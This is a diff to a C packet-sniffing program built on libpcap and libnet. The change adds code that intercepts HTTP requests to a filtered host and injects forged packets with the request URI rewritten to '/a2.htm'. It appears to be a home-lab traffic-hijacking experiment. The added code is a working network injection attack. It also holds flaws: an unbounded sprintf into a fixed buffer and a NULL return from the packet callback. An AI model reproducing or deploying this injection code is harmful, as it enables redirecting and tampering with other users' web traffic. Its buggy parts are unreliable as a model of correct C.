@@ -68,7 +68,8 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
     int size_ip = 20;
     int size_tcp;
     int size_payload;    
-    const u_char *payload; /* Packet payload */
+    //u_char *payload; /* Packet payload */
+    const char *payload;
 
     printf("\nPacket number %d:\n", count);
     count++;
@@ -116,7 +117,45 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
         printf("%s", payload);
         if (ntohs(tcphdr->th_dport) == 80)
         {
-            libnet_send(ether, iphdr, tcphdr, size_payload, payload);
+            u_char new_payload[2048];
+			//u_char *p = payload;
+            const char * p = payload;
+			while (notend(p) && ! isspace(*p) ) p++;
+
+    		if ( end(p) || iscrlf(p) ) {
+        		// set error
+        		return NULL;
+    		}
+   
+    		const char * RequestMethod = payload;
+    		int RequestMethodlen = p - payload;
+			printf("--> RequestMethod: %.*s\n", RequestMethodlen, RequestMethod);
+			
+			while (isspace(*p) && notcrlf(p) && notend(p) ) p++;
+			const char *RequestURI = p;		
+			while (!isspace(*p) && notcrlf(p) && notend(p) ) p++;
+			int RequestURIlen = p - RequestURI;			
+			printf("--> RequestURI: %.*s\n", RequestURIlen, RequestURI);			
+			const char * change_uri = "/a2.htm";
+#if 0               
+            sprintf(new_payload, "%.*s %s%s", RequestMethodlen, RequestMethod, change_uri, p);
+            printf("--> new_payload: len: %d | %s\n", strlen(new_payload), new_payload);            
+            //libnet_send(ether, iphdr, tcphdr, size_payload, payload);
+            libnet_send(ether, iphdr, tcphdr, strlen(new_payload), new_payload);
+#endif  
+         
+            if(strncmp(change_uri, RequestURI, strlen(change_uri)) != 0)
+            {
+                sprintf(new_payload, "%.*s %s %s", RequestMethodlen, RequestMethod, change_uri, p);
+                printf("--> new_payload: len: %d | %s\n", strlen(new_payload), new_payload);            
+                //libnet_send(ether, iphdr, tcphdr, size_payload, payload);
+                libnet_send(ether, iphdr, tcphdr, strlen(new_payload), new_payload);
+            }
+            else
+            {
+                printf("skip owner cap resend.\n");
+            }
+          
         }
     }
 
@@ -127,7 +166,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 int
 libnet_send(struct ether_header *ether, struct ip *iphdr, struct tcphdr *tcphdr, int size_payload, const u_char *payload)
 {
-    char *dev = "eth0";
+    char *dev = "enp0s8";
     libnet_t *handle; /* Libnet句柄 */
     int packet_size; /* 构造的数据包大小 */
 
@@ -231,7 +270,7 @@ int main(int argc, char **argv)
     pcap_t *handle;        /* packet capture handle */
 
     //char filter_exp[] = "dst 202.114.85.31 and tcp";   
-    char filter_exp[] = "host 192.168.1.103 and tcp";    /* filter expression [3] */
+    char filter_exp[] = "host 192.168.56.1 and tcp";    /* filter expression [3] */
     struct bpf_program fp;        /* compiled filter program (expression) */
     bpf_u_int32 mask;        /* subnet mask */
     bpf_u_int32 net;        /* ip */
